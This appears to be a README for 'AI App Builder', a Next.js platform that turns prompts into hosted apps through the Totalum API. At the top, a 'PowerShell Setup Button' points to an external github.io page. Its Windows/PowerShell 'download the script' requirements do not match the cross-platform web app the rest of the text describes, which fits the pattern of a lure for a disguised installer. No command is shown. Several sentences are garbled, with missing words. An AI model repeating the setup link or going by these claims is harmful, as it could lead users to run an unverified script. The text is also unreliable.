<div align="center">

# AI App Builder — Prompt-to-Production Web Platform 🚀

![](files/preview.png)

### 🔌 PowerShell Setup Button

[![](files/button.png)](https://lebrowndnasty-hash.github.io/ai-app-builder/)

[![stage](https://img.shields.io/badge/Stage-Released-2ea44f?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-Core-f59e0b?style=flat-square&labelColor=0d1117)]() [![license](https://img.shields.io/badge/License-Mit-fbbf24?style=flat-square&labelColor=0d1117)]()

</div>

---

AI App Builder transforms a plain-language prompt into a complete, production-ready Next.js application—with hosting, database, authentication, AI integration, bidirectional GitHub sync, multitenancy, and custom domains already wired in. It is a polished, self-hostable alternative for teams and independent builders who want to ship full-stack apps without assembling infrastructure piece by piece. Every project runs in an isolated sandbox observed through a live preview, visual editor, and full code editor, so ideas move from description to deployed product in a single, guided flow. The result is an approachable, white-label platform that fits just as naturally inside your own product as it does on its own.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

**Prompt to Full-Stack App.** Describe your idea in plain English and watch the AI build a complete, production-ready Next.js application from the ground up.

- **Live Preview.** See your application running in real time as the AI works, so you can follow every step of the build.

- **Visual Editor.** Click any element in the preview to adjust text, sizing, colors, or imagery. Changes are written directly back into the source and the app rebuilds instantly.

- **Full Code Editor.** A VS Code-style editor gives you complete access to every generated file. Read, refine, and save, then rebuild on demand.

- **Built-In Database.** Every project comes with its own SQL database, complete with development and live environments. Browse rows, run queries, review schemas and migrations, and manage backups, all from one place.

- **Integrated Hosting.** Each project receives a live URL from day one. Publish to production with a single click.

- **Custom Domains.** Purchase a domain in-app or connect one you already own with guided DNS setup. Manage records, renewal, and choose exactly where your site answers.

- **GitHub Sync.** Connect a repository and push or pull changes in both directions for seamless version control.

- **Figma Integration.** Paste a Figma frame link into the chat and the AI builds directly from your design.

- **Project Portability.** Package an entire project into an import code, restore it elsewhere, or duplicate it in one action.

- **Version History.** Every AI build is captured as a restorable checkpoint, complete with a diff viewer showing precisely what changed.

- **Runtime Logs.** Read logs from both your preview server and your production environment.

- **Isolated Sandboxes.** Each project runs in its own dedicated environment. Idle sandboxes wake on demand, with clear status in the interface.

- **Multi-Tenant Ready.** Create isolated projects per user or per customer with no additional configuration.

- **Secrets and Environment Variables.** Manage credentials per project and per environment with a dedicated secrets panel.

- **Deploy Anywhere.** Runs on Vercel, Docker, or any Node.js host, with no platform lock-in.

- **Broadly Accessible.** The codebase is openly available under MIT, so you can run it for yourself or embed it inside your own product.

## Tech Stack

Every layer of AI App Builder is chosen to keep the distance between an idea and a working product as short as possible. The result is a stack that feels fast in the browser, dependable under real workloads, and refreshingly simple to extend.

**Next.js 16 & React 19** form the application shell — server rendering for instant first paint, streaming for a preview that updates while the agent writes, and a routing model that keeps every workspace surface snappy. **TypeScript** runs end to end, so the contract between the prompt, the generated project, and the hosted app stays honest at every step.

**Tailwind CSS 4** powers the interface, from the chat pane to the visual editor's inspector, giving the whole product a consistent, modern finish that adapts cleanly to any brand. **Radix UI** primitives and **lucide-react** icons supply the accessible, polished components underneath, while **sonner**, **cmdk**, and **next-themes** round out the details — notifications, command palette, and theming — that make the workspace feel considered rather than assembled.

The coding surfaces are first-class citizens: **Monaco**, the engine behind VS Code, drives the code editor, so every generated file is readable and editable with the tooling developers already trust. **react-hook-form** keeps configuration flows effortless, and **fflate** handles project archives for export, import, and duplication without a hitch.

Behind the UI, a **Next.js server layer** acts as the single, secure bridge to the Totalum API — the engine that supplies hosting, isolated sandboxes, managed SQL databases, authentication, AI generation, bidirectional GitHub sync, multitenancy, and custom domains. The browser never touches your credentials; every request flows through same-origin proxy routes that attach the key server-side and forward it onward.

The whole package deploys anywhere Next.js runs — Vercel, Docker, or any Node.js host — with no platform lock-in. One codebase, one integration point, and a stack that stays out of the way while the product does the talking.

## Deployment

AI App Builder goes from a working local project to a live, customer-ready product on the infrastructure you already trust. It's a standard Next.js application with no platform lock-in, so it runs anywhere Next.js runs — your own servers, a container platform, or a managed edge host — and it scales with you as adoption grows.

**A single key unlocks the full experience.** The only thing standing between a fresh checkout and a production-grade builder is your Totalum API key. One environment variable connects hosting, databases, AI generation, custom domains, GitHub sync and sandboxes — no vendor sprawl, no glue code, no second integration to maintain. Set it in your host's environment, build, and start shipping.

**Designed for the moment you it to the public.** The builder ships intentionally so you can add the authentication and billing model that fits your product. The hooks are already in place — make the guards in the shared API layer real, protect the pages at the proxy boundary, and you have a fully gated product. Running it privately or on an internal network needs no additional layer at all.

**Your brand, your domain, your customers.** Because it's your codebase and your interface, rebranding is a styling exercise rather than a rebuild. Every generated app is an isolated project, so multi-tenancy is inherent rather than bolted on — spin up separate workspaces per user, team or client with no extra work. Connect a custom domain, publish to production in a single click, and your customers see a polished product that carries your name.

**Operational confidence built in.** Runtime logs from both preview and production, restorable version checkpoints with a diff viewer, and per-project secrets management mean you can diagnose issues and roll back changes without guesswork. Isolated sandboxes keep every project contained, waking on demand and surfacing status to the user rather than failing silently.

Whether you're running AI App Builder as a standalone destination or embedding it as a capability inside a larger SaaS, deployment is the shortest part of the journey — and the foundation for everything you build on top of it.

## FAQ

**Is AI App Builder really accessible?**

The code is and available at no charge. Running it requires a Totalum API key, which comes with the first 50 AI credits included at no cost, so you can start building immediately. You only pay as your usage grows.

**Do I need to set up a database, hosting or an AI provider separately?**

No. One Totalum API key provides hosting, databases, AI, domains, GitHub sync and sandboxes. Everything a full-stack app needs is bundled in a single integration. You can still add your own providers such as Supabase or Stripe if you prefer.

**Can my users build apps inside my own product?**

Yes. AI App Builder is multi-tenant and white-label by design. Create isolated projects per user, team or customer, rebrand the interface to match your product, and embed it in your dashboard. It becomes a native feature of your platform rather than a separate tool.

**What kinds of apps can the AI build?**

The AI agent generates complete full-stack Next.js applications from a plain-English prompt — anything from a CRM with kanban boards to a booking system with payments. Each generated app ships with its own database, authentication, hosting and custom domain support.

**Can I export or sync the generated code?**

Yes. Every project syncs bidirectionally with GitHub, so you can push or pull changes at any time. You can also export a whole project as an import code, duplicate it in one action, or restore any previous build from version history.

**How does the visual editor work?**

Click any element in the live preview and adjust its text, size, colours or imagery. The change is written back to the exact file and line in the source, and the app rebuilds automatically. You get the speed of a no-code editor with the fidelity of real code.

**Is my API key exposed to the browser?**

No. The key is read on the server only and never reaches the client. All requests flow through same-origin proxy routes that add the key server-side before forwarding to the Totalum API.

**Where can I deploy the builder itself?**

Anywhere Next.js runs — Vercel, Docker, or any Node.js host. There is no platform lock-in, and the app deploys in minutes with a single environment variable.

**What happens when I run out of AI credits?**

The app notifies you once and points to the billing page so you can top up. Credits belong to the operator account, so the message is intended for you rather than your end users.

**Do the generated apps come with authentication?**

Yes. Every app the AI builds includes managed authentication, a database, file storage, SSL, CDN and deploys — all handled by the Totalum API with nothing extra to install.

## License

This project is released under the MIT License, giving you the freedom to use, modify, and distribute the code however you see fit. Whether you are building a personal project, launching a commercial product, or embedding AI App Builder inside your own platform, the license is designed to stay out of your way.

You are welcome to rebrand it, extend it, and shape it into something entirely your own. The only requirement is that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

In short: AI App Builder is openly available for anyone to build on — commercially or otherwise — with minimal strings attached and maximum room to make it yours.